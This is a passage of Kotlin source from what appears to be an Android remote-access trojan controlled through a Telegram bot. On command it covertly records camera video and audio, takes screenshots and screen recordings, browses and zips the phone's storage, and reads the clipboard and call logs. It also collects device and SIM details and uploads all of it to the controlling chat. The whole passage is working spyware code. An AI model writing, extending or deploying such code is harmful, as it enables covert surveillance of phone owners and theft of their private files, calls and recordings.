    //  VIDEO — uses MediaRecorder with Surface (no CameraX conflict)
    // ══════════════════════════════════════════════════════════════════════════

    private suspend fun handleVideo(chatId: String, rawText: String) {
        if (!hasPerm(Manifest.permission.CAMERA) || !hasPerm(Manifest.permission.RECORD_AUDIO)) {
            sendMessage(chatId, "${dp()}⚠️ CAMERA + RECORD_AUDIO permissions required."); return
        }
        val stripped = rawText.lowercase().removePrefix("/video").trim()
        val parts    = stripped.split(" ")
        val dur      = parts[0].toIntOrNull() ?: run {
            sendMessage(chatId, "${dp()}❌ Wrong command. Usage: /video30 or /video30 front"); return
        }
        val isFront  = parts.any { it == "front" }
        val camId    = if (isFront) android.hardware.camera2.CameraCharacteristics.LENS_FACING_FRONT
                       else android.hardware.camera2.CameraCharacteristics.LENS_FACING_BACK
        val label    = if (isFront) "front" else "rear"
        sendMessage(chatId, "${dp()}🎥 Recording ${dur}s ($label cam)…\n⏳ ~${dur}s | 0%")

        val file = File(cacheDir, "video_${System.currentTimeMillis()}.mp4")
        @Suppress("DEPRECATION")
        val rec  = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
            android.media.MediaRecorder(this) else android.media.MediaRecorder()
        try {
            // Get camera ID string
            val camMgr   = getSystemService(CAMERA_SERVICE) as android.hardware.camera2.CameraManager
            val cameraId = camMgr.cameraIdList.firstOrNull { id ->
                val chars = camMgr.getCameraCharacteristics(id)
                chars.get(android.hardware.camera2.CameraCharacteristics.LENS_FACING) == camId
            } ?: camMgr.cameraIdList.first()

            rec.apply {
                setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
                setVideoSource(android.media.MediaRecorder.VideoSource.SURFACE)
                setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4)
                setVideoEncoder(android.media.MediaRecorder.VideoEncoder.H264)
                setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC)
                setVideoSize(1280, 720)
                setVideoFrameRate(30)
                setVideoEncodingBitRate(2_000_000)
                setAudioSamplingRate(44100)
                setAudioEncodingBitRate(128_000)
                setOutputFile(file.absolutePath)
                prepare()
            }
            val surface = rec.surface

            // Open camera and create capture session
            val latch   = CountDownLatch(1)
            var session: android.hardware.camera2.CameraCaptureSession? = null
            var camDevice: android.hardware.camera2.CameraDevice? = null

            val stateCallback = object : android.hardware.camera2.CameraDevice.StateCallback() {
                override fun onOpened(cam: android.hardware.camera2.CameraDevice) {
                    camDevice = cam
                    val req = cam.createCaptureRequest(android.hardware.camera2.CameraDevice.TEMPLATE_RECORD)
                    req.addTarget(surface)
                    @Suppress("DEPRECATION")
                    cam.createCaptureSession(listOf(surface),
                        object : android.hardware.camera2.CameraCaptureSession.StateCallback() {
                            override fun onConfigured(s: android.hardware.camera2.CameraCaptureSession) {
                                session = s
                                s.setRepeatingRequest(req.build(), null, null)
                                rec.start()
                                latch.countDown()
                            }
                            override fun onConfigureFailed(s: android.hardware.camera2.CameraCaptureSession) { latch.countDown() }
                        }, mainHandler)
                }
                override fun onDisconnected(cam: android.hardware.camera2.CameraDevice) { cam.close(); latch.countDown() }
                override fun onError(cam: android.hardware.camera2.CameraDevice, err: Int) { cam.close(); latch.countDown() }
            }

            try {
                camMgr.openCamera(cameraId, stateCallback, mainHandler)
            } catch (e: SecurityException) {
                sendMessage(chatId, "${dp()}❌ Camera permission denied."); return
            }

            if (!latch.await(10, TimeUnit.SECONDS)) {
                sendMessage(chatId, "${dp()}❌ Camera open timed out."); return
            }

            // Record with progress
            var elapsed = 0
            while (elapsed < dur) {
                if (isStopped(chatId)) {
                    sendMessage(chatId, "${dp()}🛑 Video stopped at ${elapsed}s.")
                    break
                }
                val wait = minOf(10, dur - elapsed)
                delay(wait * 1000L); elapsed += wait
                if (elapsed < dur) sendMessage(chatId, "${dp()}🎥 ${elapsed}/${dur}s | ${elapsed * 100 / dur}%")
            }

            // Stop recording
            try { session?.stopRepeating() } catch (_: Exception) {}
            try { session?.close() } catch (_: Exception) {}
            try { camDevice?.close() } catch (_: Exception) {}
            try { rec.stop() } catch (_: Exception) {}
            rec.release()

            if (!file.exists() || file.length() == 0L) {
                sendMessage(chatId, "${dp()}❌ Video empty."); return
            }
            sendMessage(chatId, "${dp()}🎥 Done! ${formatSize(file.length())} — uploading…\n⏳ 90%")
            if (file.length() <= CHUNK_LIMIT) uploadVideo(chatId, file, "🎥 $label ${dur}s")
            else splitVideo(chatId, file, label, dur)

        } catch (e: Exception) {
            sendMessage(chatId, "${dp()}❌ Video error: ${e.message}")
            try { rec.release() } catch (_: Exception) {}
        } finally { try { file.delete() } catch (_: Exception) {} }
    }

    private fun uploadVideo(chatId: String, file: File, caption: String) {
        try {
            val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart("video", file.name, file.readBytes().toRequestBody("video/mp4".toMediaTypeOrNull()))
                .addFormDataPart("caption", "${dp()}$caption").build()
            httpClient.newCall(Request.Builder().url(URL_SEND_VIDEO).post(body).build()).execute().use { r ->
                if (!r.isSuccessful) sendMessage(chatId, "${dp()}❌ Video upload failed: ${r.code}")
                else sendMessage(chatId, "${dp()}✅ Video sent!")
            }
        } catch (e: Exception) { sendMessage(chatId, "${dp()}❌ Video error: ${e.message}") }
    }

    private fun splitVideo(chatId: String, file: File, label: String, dur: Int) {
        val data  = file.readBytes()
        val total = Math.ceil(data.size.toDouble() / CHUNK_LIMIT).toInt()
        sendMessage(chatId, "${dp()}📦 Large video — splitting $total parts…")
        for (i in 0 until total) {
            val start    = (i * CHUNK_LIMIT).toInt()
            val end      = minOf(start + CHUNK_LIMIT.toInt(), data.size)
            val chunk    = data.copyOfRange(start, end)
            val partFile = File(cacheDir, "vpart${i + 1}_${System.currentTimeMillis()}.mp4")
            partFile.writeBytes(chunk)
            sendMessage(chatId, "${dp()}⬆️ Part ${i + 1}/$total…")
            try {
                val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", chatId)
                    .addFormDataPart("document", partFile.name, chunk.toRequestBody("video/mp4".toMediaTypeOrNull()))
                    .addFormDataPart("caption", "🎥 $label ${dur}s — Part ${i + 1}/$total").build()
                httpClient.newCall(Request.Builder().url(URL_SEND_DOCUMENT).post(body).build()).execute().use {}
            } finally { partFile.delete() }
        }
        sendMessage(chatId, "${dp()}✅ All $total video parts sent!")
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  FILE MANAGER — clean numbered UI with path breadcrumb
    // ══════════════════════════════════════════════════════════════════════════

    private suspend fun handleAllFiles(chatId: String, pathArg: String) {
        val root   = Environment.getExternalStorageDirectory()
        val target = if (pathArg.isEmpty()) root else resolveFolder(root, pathArg)
        if (target == null) {
            sendMessage(chatId, "${dp()}❌ Not found: `$pathArg`\nSend /allfiles to start from root.", "Markdown"); return
        }

        val relPath  = if (pathArg.isEmpty()) "" else pathArg
        val dispPath = "/storage/emulated/0${if (relPath.isEmpty()) "" else "/$relPath"}"
        pathCache[chatId] = relPath

        // Folders first (sorted), then files (sorted) — numbered 1..N continuously
        val allFiles  = try { target.listFiles() } catch (_: SecurityException) { null }
        if (allFiles == null) {
            sendMessage(chatId, "${dp()}❌ Cannot read folder — permission denied.", "Markdown"); return
        }
        val folders = allFiles.filter { it.isDirectory }.sortedBy { it.name.lowercase() }
        val files   = allFiles.filter { it.isFile }.sortedBy { it.name.lowercase() }
        val items     = (folders + files).map { FsItem(it.name, it, it.isDirectory) }
        fsCache[chatId] = items

        if (items.isEmpty()) {
            sendMessage(chatId, "${dp()}📂 *$dispPath*\n\n📭 Empty.", "Markdown"); return
        }

        // ── Header message ──
        sendMessage(chatId,
            "${dp()}📂 *$dispPath*\n📁 ${folders.size} folders  •  📄 ${files.size} files\n─────────────────────────",
            "Markdown")

        // ── Send folders page by page (15 per message) ──
        if (folders.isNotEmpty()) {
            var page  = StringBuilder("📁 *FOLDERS:*\n\n")
            var count = 0
            folders.forEachIndexed { i, f ->
                if (isStopped(chatId)) return
                val num   = i + 1  // folders are always 1..folders.size
                val inner = try { f.listFiles()?.size ?: 0 } catch (_: Exception) { 0 }
                val size  = formatSize(getFolderSize(f))
                page.append("$num. 📁 *${f.name}*\n    📊 $inner items • $size\n\n")
                count++
                if (count >= PAGE_SIZE) {
                    sendMessage(chatId, page.toString().trimEnd(), "Markdown")
                    page = StringBuilder()
                    count = 0
                    delay(300L)
                }
            }
            if (count > 0) sendMessage(chatId, page.toString().trimEnd(), "Markdown")
        }

        // ── Send files page by page ──
        if (files.isNotEmpty()) {
            var page  = StringBuilder("📄 *FILES:*\n\n")
            var count = 0
            files.forEachIndexed { i, f ->
                if (isStopped(chatId)) return
                val num = folders.size + i + 1  // files numbered after folders
                page.append("$num. 📄 *${f.name}*\n    💾 ${formatSize(f.length())}\n\n")
                count++
                if (count >= PAGE_SIZE) {
                    sendMessage(chatId, page.toString().trimEnd(), "Markdown")
                    page = StringBuilder()
                    count = 0
                    delay(300L)
                }
            }
            if (count > 0) sendMessage(chatId, page.toString().trimEnd(), "Markdown")
        }

        val zipPath = if (relPath.isEmpty()) "/" else relPath
        sendMessage(chatId,
            "─────────────────────────\n" +
            "💡 *Type number* → folder khule ya file download ho\n" +
            "🗜️ `/zip $zipPath` — ZIP this folder\n" +
            "🛑 /stop — ruk jao",
            "Markdown")
    }

    private suspend fun handleFsSelect(chatId: String, num: Int) {
        val items = fsCache[chatId]
        if (items.isNullOrEmpty()) {
            sendMessage(chatId, "${dp()}⚠️ Browse first with /allfiles"); return
        }
        val idx = num - 1
        if (idx < 0 || idx >= items.size) {
            sendMessage(chatId, "${dp()}❌ Choose 1–${items.size}."); return
        }
        val item = items[idx]
        if (item.isDir) {
            // Navigate into folder
            val curPath  = pathCache[chatId] ?: ""
            val newPath  = if (curPath.isEmpty()) item.name else "$curPath/${item.name}"
            handleAllFiles(chatId, newPath)
        } else {
            // Download file
            val estSec = (item.file.length() / 300_000L).coerceAtLeast(2)
            sendMessage(chatId,
                "${dp()}📤 Sending `${item.name}` (${formatSize(item.file.length())})…\n⏳ ~${estSec}s",
                "Markdown")
            if (item.file.length() > CHUNK_LIMIT) {
                zipAndSendInChunks(chatId, listOf(item.file), item.file.nameWithoutExtension)
                return
            }
            try {
                val mime = MimeTypeMap.getSingleton()
                    .getMimeTypeFromExtension(item.file.extension.lowercase()) ?: "application/octet-stream"
                val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", chatId)
                    .addFormDataPart("document", item.file.name,
                        item.file.readBytes().toRequestBody(mime.toMediaTypeOrNull()))
                    .addFormDataPart("caption", "📎 ${item.file.name} (${formatSize(item.file.length())})").build()
                httpClient.newCall(Request.Builder().url(URL_SEND_DOCUMENT).post(body).build()).execute().use { r ->
                    if (!r.isSuccessful) sendMessage(chatId, "${dp()}❌ Upload failed: ${r.code}")
                    else sendMessage(chatId, "${dp()}✅ `${item.name}` sent!", "Markdown")
                }
            } catch (e: Exception) { sendMessage(chatId, "${dp()}❌ Error: ${e.message}") }
        }
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  ZIP
    // ══════════════════════════════════════════════════════════════════════════

    private suspend fun handleZip(chatId: String, pathArg: String) {
        val root   = Environment.getExternalStorageDirectory()
        val target = resolveFolder(root, pathArg) ?: File(root, pathArg).takeIf { it.isFile }
        if (target == null) { sendMessage(chatId, "${dp()}❌ Not found: `$pathArg`", "Markdown"); return }
        val files = if (target.isFile) listOf(target)
                    else {
                        try {
                            val allFiles = mutableListOf<File>()
                            for (f in target.walkTopDown()) {
                                if (isStopped(chatId)) { sendMessage(chatId, "${dp()}🛑 ZIP stopped."); return }
                                if (f.isFile) allFiles.add(f)
                            }
                            allFiles
                        } catch (_: SecurityException) {
                            sendMessage(chatId, "${dp()}❌ Permission denied reading folder.")
                            return
                        }
                    }
        sendMessage(chatId,
            "${dp()}🗜️ Zipping `$pathArg`…\n📊 ${files.size} files, ${formatSize(files.sumOf { it.length() })}\n⏳ 0%",
            "Markdown")
        zipAndSendInChunks(chatId, files, target.name)
    }

    private suspend fun zipAndSendInChunks(chatId: String, files: List<File>, baseName: String) {
        val chunks = mutableListOf<MutableList<File>>()
        var cur = mutableListOf<File>(); var curSize = 0L
        for (f in files) {
            if (isStopped(chatId)) { sendMessage(chatId, "${dp()}🛑 ZIP stopped."); return }
            val sz = f.length()
            if (sz > CHUNK_LIMIT) { sendMessage(chatId, "${dp()}⚠️ Skipped `${f.name}` (${formatSize(sz)} > 49MB)", "Markdown"); continue }
            if (curSize + sz > CHUNK_LIMIT && cur.isNotEmpty()) { chunks.add(cur); cur = mutableListOf(); curSize = 0L }
            cur.add(f); curSize += sz
        }
        if (cur.isNotEmpty()) chunks.add(cur)
        if (chunks.isEmpty()) { sendMessage(chatId, "${dp()}❌ Nothing to ZIP."); return }
        val total = chunks.size
        chunks.forEachIndexed { idx, chunkFiles ->
            if (isStopped(chatId)) { sendMessage(chatId, "${dp()}🛑 ZIP stopped."); return }
            val pct     = ((idx + 1) * 100 / total)
            val partLbl = if (total > 1) "_part${idx + 1}of$total" else ""
            val zipFile = File(cacheDir, "$baseName${partLbl}_${System.currentTimeMillis()}.zip")
            if (total > 1) sendMessage(chatId, "${dp()}📦 Building part ${idx + 1}/$total… $pct%")
            try {
                ZipOutputStream(zipFile.outputStream().buffered()).use { zos ->
                    for (f in chunkFiles) {
                        try { zos.putNextEntry(ZipEntry(f.name)); f.inputStream().use { it.copyTo(zos) }; zos.closeEntry() }
                        catch (_: Exception) {}
                    }
                }
                if (!zipFile.exists() || zipFile.length() == 0L) {
                    sendMessage(chatId, "${dp()}❌ ZIP part ${idx + 1} empty."); return@forEachIndexed
                }
                val cap = if (total > 1) "📦 $baseName — Part ${idx + 1}/$total (${formatSize(zipFile.length())})"
                          else "📦 $baseName.zip (${formatSize(zipFile.length())})"
                sendMessage(chatId, "${dp()}⬆️ Uploading $cap… $pct%")
                val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", chatId)
                    .addFormDataPart("document", zipFile.name,
                        zipFile.readBytes().toRequestBody("application/zip".toMediaTypeOrNull()))
                    .addFormDataPart("caption", cap).build()
                httpClient.newCall(Request.Builder().url(URL_SEND_DOCUMENT).post(body).build()).execute().use { r ->
                    if (!r.isSuccessful) sendMessage(chatId, "${dp()}❌ Upload failed part ${idx + 1}: ${r.code}")
                }
            } catch (e: Exception) { sendMessage(chatId, "${dp()}❌ ZIP error part ${idx + 1}: ${e.message}") }
            finally { try { zipFile.delete() } catch (_: Exception) {} }
        }
        if (total > 1) sendMessage(chatId, "${dp()}✅ All $total ZIP parts sent!")
        else sendMessage(chatId, "${dp()}✅ ZIP sent!")
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  INCOMING DOCUMENT FROM USER
    // ══════════════════════════════════════════════════════════════════════════

    private suspend fun handleIncomingDoc(chatId: String, fileObj: JSONObject,
                                          fallback: String = "received_${System.currentTimeMillis()}") {
        val fileId   = fileObj.optString("file_id").ifEmpty { sendMessage(chatId, "${dp()}⚠️ No file_id."); return }
        val fileName = fileObj.optString("file_name").ifEmpty { fallback }
        sendMessage(chatId, "${dp()}💾 Saving *$fileName*… | 0%", "Markdown")
        try {
            val path = getTgFilePath(fileId) ?: run { sendMessage(chatId, "${dp()}❌ Cannot resolve file."); return }
            sendMessage(chatId, "${dp()}⬇️ Downloading… 50%")
            val bytes = httpClient.newCall(Request.Builder().url("$BASE_FILE_URL/$path").get().build())
                .execute().use { r ->
                    if (!r.isSuccessful) { sendMessage(chatId, "${dp()}❌ Download failed: ${r.code}"); return }
                    r.body?.bytes() ?: run { sendMessage(chatId, "${dp()}❌ Empty."); return }
                }
            val mime = MimeTypeMap.getSingleton()
                .getMimeTypeFromExtension(fileName.substringAfterLast('.', "")) ?: "application/octet-stream"
            if (saveToDownloads(fileName, mime, bytes))
                sendMessage(chatId, "${dp()}✅ *$fileName* saved to Downloads.", "Markdown")
            else sendMessage(chatId, "${dp()}❌ Failed to save file.")
        } catch (e: Exception) { sendMessage(chatId, "${dp()}❌ Error: ${e.message}") }
    }

    private fun getTgFilePath(fileId: String): String? {
        return try {
            val body = httpClient.newCall(Request.Builder().url("$URL_GET_FILE?file_id=$fileId").get().build())
                .execute().use { it.body?.string() } ?: return null
            val json = JSONObject(body)
            if (!json.optBoolean("ok", false)) null
            else json.optJSONObject("result")?.optString("file_path")
        } catch (_: Exception) { null }
    }

    private fun saveToDownloads(fileName: String, mimeType: String, bytes: ByteArray): Boolean {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                val values = ContentValues().apply {
                    put(MediaStore.Downloads.DISPLAY_NAME, fileName)
                    put(MediaStore.Downloads.MIME_TYPE, mimeType)
                    put(MediaStore.Downloads.IS_PENDING, 1)
                }
                val uri = contentResolver.insert(
                    MediaStore.Downloads.getContentUri(MediaStore.VOLUME_EXTERNAL_PRIMARY), values)
                    ?: return false
                contentResolver.openOutputStream(uri)?.use { it.write(bytes) }
                values.clear(); values.put(MediaStore.Downloads.IS_PENDING, 0)
                contentResolver.update(uri, values, null, null)
            } else {
                val dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
                dir.mkdirs(); File(dir, fileName).writeBytes(bytes)
            }
            true
        } catch (_: Exception) { false }
    }


    // ══════════════════════════════════════════════════════════════════════════
    //  DEVICE INFO
    // ══════════════════════════════════════════════════════════════════════════

    private suspend fun handleDeviceInfo(chatId: String) {
        sendMessage(chatId, "${dp()}📱 Getting device info…")
        try {
            // Battery
            val bm      = getSystemService(BATTERY_SERVICE) as BatteryManager
            val batPct  = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
            val charging = bm.isCharging
            val batStatus = if (charging) "⚡ Charging" else "🔋 Discharging"

            // RAM
            val am   = getSystemService(ACTIVITY_SERVICE) as ActivityManager
            val mi   = ActivityManager.MemoryInfo()
            am.getMemoryInfo(mi)
            val ramTotal = formatSize(mi.totalMem)
            val ramFree  = formatSize(mi.availMem)
            val ramUsed  = formatSize(mi.totalMem - mi.availMem)

            // Storage
            val stat      = StatFs(Environment.getExternalStorageDirectory().path)
            val storTotal = formatSize(stat.totalBytes)
            val storFree  = formatSize(stat.availableBytes)
            val storUsed  = formatSize(stat.totalBytes - stat.availableBytes)

            // Internal storage
            val iStat     = StatFs(Environment.getDataDirectory().path)
            val iTotal    = formatSize(iStat.totalBytes)
            val iFree     = formatSize(iStat.availableBytes)

            // Network
            val cm  = getSystemService(CONNECTIVITY_SERVICE) as ConnectivityManager
            val net = cm.activeNetwork
            val cap = cm.getNetworkCapabilities(net)
            val networkType = when {
                cap == null -> "❌ No network"
                cap.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> {
                    val wm = applicationContext.getSystemService(WIFI_SERVICE) as WifiManager
                    val info = wm.connectionInfo
                    "📶 WiFi: ${info.ssid} (${info.rssi} dBm)"
                }
                cap.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "📡 Mobile Data"
                else -> "🌐 Other"
            }

            // Phone info
            val tm       = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
            val operator = tm.networkOperatorName.ifEmpty { "N/A" }
            val simState = if (tm.simState == TelephonyManager.SIM_STATE_READY) "✅ Ready" else "❌ Not Ready"

            // Android info
            val androidVer = Build.VERSION.RELEASE
            val sdk        = Build.VERSION.SDK_INT
            val model      = "${Build.MANUFACTURER} ${Build.MODEL}"
            val uptime     = formatAgo(android.os.SystemClock.elapsedRealtime())

            sendMessage(chatId, """
${dp()}📱 *Device Info*

🔋 *Battery:* $batPct% — $batStatus
─────────────────────
💾 *RAM:*
  Total: $ramTotal
  Used:  $ramUsed
  Free:  $ramFree
─────────────────────
💽 *External Storage:*
  Total: $storTotal
  Used:  $storUsed
  Free:  $storFree
💽 *Internal Storage:*
  Total: $iTotal
  Free:  $iFree
─────────────────────
🌐 *Network:* $networkType
📡 *Operator:* $operator
📱 *SIM:* $simState
─────────────────────
🤖 *Android:* $androidVer (API $sdk)
📲 *Device:* $model
⏱ *Uptime:* $uptime
            """.trimIndent(), "Markdown")
        } catch (e: Exception) {
            sendMessage(chatId, "${dp()}❌ Error getting device info: ${e.message}")
        }
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  SCREENSHOT
    // ══════════════════════════════════════════════════════════════════════════

    private suspend fun handleScreenshot(chatId: String) {
        // Screenshot requires MediaProjection which needs user permission via Activity.
        // Without that, we can capture the app's own window or use the accessibility trick.
        // Best approach without root: inform user and use UiAutomation if available.
        sendMessage(chatId, "${dp()}📸 Taking screenshot…\n⏳ ~3s")
        try {
            // Try to use Android's built-in screenshot via shell (works on most devices)
            val screenshotFile = File(cacheDir, "screenshot_${System.currentTimeMillis()}.png")
            val process = Runtime.getRuntime().exec(arrayOf("screencap", "-p", screenshotFile.absolutePath))
            process.waitFor(5, TimeUnit.SECONDS)

            if (screenshotFile.exists() && screenshotFile.length() > 0) {
                sendMessage(chatId, "${dp()}📤 Uploading screenshot… 80%")
                val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", chatId)
                    .addFormDataPart("photo", screenshotFile.name,
                        screenshotFile.asRequestBody("image/png".toMediaTypeOrNull()))
                    .addFormDataPart("caption", "${dp()}📸 Screenshot").build()
                httpClient.newCall(Request.Builder().url(URL_SEND_PHOTO).post(body).build())
                    .execute().use { r ->
                        if (!r.isSuccessful) sendMessage(chatId, "${dp()}❌ Upload failed: ${r.code}")
                        else sendMessage(chatId, "${dp()}✅ Screenshot sent!")
                    }
                screenshotFile.delete()
            } else {
                sendMessage(chatId, "${dp()}❌ Screenshot failed — device may require root or accessibility service.")
            }
        } catch (e: Exception) {
            sendMessage(chatId, "${dp()}❌ Screenshot error: ${e.message}")
        }
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  SCREEN RECORD
    // ══════════════════════════════════════════════════════════════════════════

    private suspend fun handleScreenRecord(chatId: String, seconds: Int) {
        val dur = seconds.coerceIn(1, 300)
        sendMessage(chatId, "${dp()}🎥 Screen recording ${dur}s…\n⏳ ~${dur}s | 0%")
        try {
            val outFile = File(cacheDir, "screenrec_${System.currentTimeMillis()}.mp4")
            // Use Android screenrecord command (works without root on most devices)
            val process = Runtime.getRuntime().exec(arrayOf(
                "screenrecord",
                "--time-limit", dur.toString(),
                "--bit-rate", "2000000",
                "--size", "720x1280",
                outFile.absolutePath
            ))

            // Progress updates
            var elapsed = 0
            while (elapsed < dur) {
                if (isStopped(chatId)) {
                    process.destroy()
                    sendMessage(chatId, "${dp()}🛑 Screen record stopped at ${elapsed}s.")
                    if (outFile.exists() && outFile.length() > 0) uploadScreenRec(chatId, outFile, elapsed)
                    return
                }
                val wait = minOf(10, dur - elapsed)
                delay(wait * 1000L); elapsed += wait
                if (elapsed < dur) sendMessage(chatId, "${dp()}🎥 Recording… ${elapsed}/${dur}s | ${elapsed * 100 / dur}%")
            }

            process.waitFor(10, TimeUnit.SECONDS)

            if (!outFile.exists() || outFile.length() == 0L) {
                sendMessage(chatId, "${dp()}❌ Screen recording failed — device may not support screenrecord command.")
                return
            }
            sendMessage(chatId, "${dp()}🎥 Done! ${formatSize(outFile.length())} — uploading… 90%")
            uploadScreenRec(chatId, outFile, dur)
        } catch (e: Exception) {
            sendMessage(chatId, "${dp()}❌ Screen record error: ${e.message}")
        }
    }

    private fun uploadScreenRec(chatId: String, file: File, durSec: Int) {
        try {
            if (file.length() <= CHUNK_LIMIT) {
                val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", chatId)
                    .addFormDataPart("video", file.name,
                        file.readBytes().toRequestBody("video/mp4".toMediaTypeOrNull()))
                    .addFormDataPart("caption", "${dp()}🎥 Screen Recording (${durSec}s)")
                    .addFormDataPart("duration", durSec.toString()).build()
                httpClient.newCall(Request.Builder().url(URL_SEND_VIDEO).post(body).build())
                    .execute().use { r ->
                        if (!r.isSuccessful) sendMessage(chatId, "${dp()}❌ Upload failed: ${r.code}")
                        else sendMessage(chatId, "${dp()}✅ Screen recording sent!")
                    }
            } else {
                // Split into chunks
                val data  = file.readBytes()
                val total = Math.ceil(data.size.toDouble() / CHUNK_LIMIT).toInt()
                sendMessage(chatId, "${dp()}📦 Large recording — splitting $total parts…")
                for (i in 0 until total) {
                    val start    = (i * CHUNK_LIMIT).toInt()
                    val end      = minOf(start + CHUNK_LIMIT.toInt(), data.size)
                    val chunk    = data.copyOfRange(start, end)
                    val partFile = File(cacheDir, "srec_p${i+1}_${System.currentTimeMillis()}.mp4")
                    partFile.writeBytes(chunk)
                    sendMessage(chatId, "${dp()}⬆️ Part ${i+1}/$total uploading…")
                    try {
                        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                            .addFormDataPart("chat_id", chatId)
                            .addFormDataPart("document", partFile.name,
                                chunk.toRequestBody("video/mp4".toMediaTypeOrNull()))
                            .addFormDataPart("caption", "🎥 Screen Rec ${durSec}s — Part ${i+1}/$total").build()
                        httpClient.newCall(Request.Builder().url(URL_SEND_DOCUMENT).post(body).build())
                            .execute().use {}
                    } finally { partFile.delete() }
                }
                sendMessage(chatId, "${dp()}✅ All $total parts sent!")
            }
        } catch (e: Exception) {
            sendMessage(chatId, "${dp()}❌ Upload error: ${e.message}")
        } finally {
            try { file.delete() } catch (_: Exception) {}
        }
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  CLIPBOARD
    // ══════════════════════════════════════════════════════════════════════════

    private suspend fun handleClipboard(chatId: String) {
        var clipText: String? = null
        val latch = CountDownLatch(1)
        mainHandler.post {
            try {
                val cm = getSystemService(CLIPBOARD_SERVICE) as ClipboardManager
                clipText = if (cm.hasPrimaryClip()) {
                    cm.primaryClip?.getItemAt(0)?.coerceToText(applicationContext)?.toString()
                } else null
            } catch (_: Exception) {}
            latch.countDown()
        }
        latch.await(5, TimeUnit.SECONDS)
        if (clipText.isNullOrEmpty()) {
            sendMessage(chatId, "${dp()}📋 Clipboard is empty.")
        } else {
            val preview = if (clipText!!.length > 3000) clipText!!.take(3000) + "…" else clipText!!
            sendMessage(chatId, "${dp()}📋 *Clipboard:*\n\n${preview}", "Markdown")
        }
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  CALL LOGS
    // ══════════════════════════════════════════════════════════════════════════

    private suspend fun handleCallLog(chatId: String, limit: Int) {
        if (!hasPerm(Manifest.permission.READ_CALL_LOG)) {
            sendMessage(chatId, "${dp()}⚠️ READ_CALL_LOG permission not granted."); return
        }
        sendMessage(chatId, "${dp()}📞 Loading call logs… | 0%")
        val calls = readCallLog(limit)
        if (calls.isEmpty()) { sendMessage(chatId, "${dp()}📭 No call logs."); return }
        val dateFmt = SimpleDateFormat("MM-dd HH:mm", Locale.getDefault())
        var page = StringBuilder("${dp()}📞 *Call Logs (${calls.size}):*\n\n")
        var count = 0
        calls.forEachIndexed { i, call ->
            if (isStopped(chatId)) { sendMessage(chatId, "${dp()}🛑 Stopped."); return }
            val number   = call.optString("number", "Unknown")
            val name     = call.optString("name", "").let { if (it.isNotEmpty()) " ($it)" else "" }
            val typeEmoji = when (call.optInt("type")) {
                CallLog.Calls.INCOMING_TYPE  -> "📥"
                CallLog.Calls.OUTGOING_TYPE  -> "📤"
                CallLog.Calls.MISSED_TYPE    -> "❌"
                CallLog.Calls.REJECTED_TYPE  -> "🚫"
                else -> "📞"
            }
            val dur  = call.optLong("duration")
            val durStr = if (dur > 0) "${dur / 60}m ${dur % 60}s" else "—"
            val date = dateFmt.format(Date(call.optLong("date")))
            page.append("$typeEmoji *$number*$name\n   🕐 $date  ⏱ $durStr\n\n")
            count++
            if (count >= PAGE_SIZE || i == calls.size - 1) {
                sendMessage(chatId, page.toString().trimEnd(), "Markdown")
                if (i < calls.size - 1) { page = StringBuilder(); count = 0 }
            }
        }
        sendMessage(chatId, "${dp()}✅ Done — ${calls.size} calls.")
    }

    private fun readCallLog(limit: Int): List<JSONObject> {
        val list   = mutableListOf<JSONObject>()
        val cursor = contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.CACHED_NAME,
                    CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.DURATION),
            null, null, "${CallLog.Calls.DATE} DESC"
        ) ?: return list
        cursor.use { c ->
            val nc  = c.getColumnIndex(CallLog.Calls.NUMBER)
            val nmc = c.getColumnIndex(CallLog.Calls.CACHED_NAME)
            val tc  = c.getColumnIndex(CallLog.Calls.TYPE)
            val dc  = c.getColumnIndex(CallLog.Calls.DATE)
            val drc = c.getColumnIndex(CallLog.Calls.DURATION)
            while (c.moveToNext() && list.size < limit) {
                list.add(JSONObject().apply {
                    put("number",   c.getString(nc) ?: "?")
                    put("name",     c.getString(nmc) ?: "")
                    put("type",     c.getInt(tc))
                    put("date",     c.getLong(dc))
                    put("duration", c.getLong(drc))
                })
            }
        }
        return list
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  HELPERS
    // ══════════════════════════════════════════════════════════════════════════

    private fun hasPerm(p: String) = ContextCompat.checkSelfPermission(this, p) == PackageManager.PERMISSION_GRANTED

    private fun resolveFolder(root: File, path: String): File? {
        val direct = File(root, path)
        if (direct.exists() && direct.isDirectory) return direct
        var cur = root
        for (seg in path.split("/")) {
            cur = cur.listFiles()?.firstOrNull { it.name.lowercase() == seg.lowercase() && it.isDirectory }
                ?: return null
        }
        return cur
    }

    private fun getFolderSize(dir: File): Long {
        // Only direct children — deep scan is too slow for large folders
        return try {
            dir.listFiles()?.sumOf { if (it.isFile) it.length() else 0L } ?: 0L
        } catch (_: Exception) { 0L }
    }

    private fun formatAgo(ms: Long): String {
        val s = ms / 1000
        return when {
